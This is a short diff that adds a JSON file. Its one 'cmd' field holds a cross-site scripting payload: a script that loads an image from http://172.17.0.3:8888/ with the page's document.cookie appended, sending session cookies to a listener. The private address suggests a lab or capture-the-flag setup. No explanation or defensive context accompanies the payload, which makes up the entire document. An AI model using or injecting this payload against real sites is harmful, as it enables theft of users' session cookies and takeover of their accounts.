@@ -1,0 +1,3 @@
+{
+    "cmd": "<script>var i=new Image;i.src='http://172.17.0.3:8888/?'+document.cookie;</script>"
+}
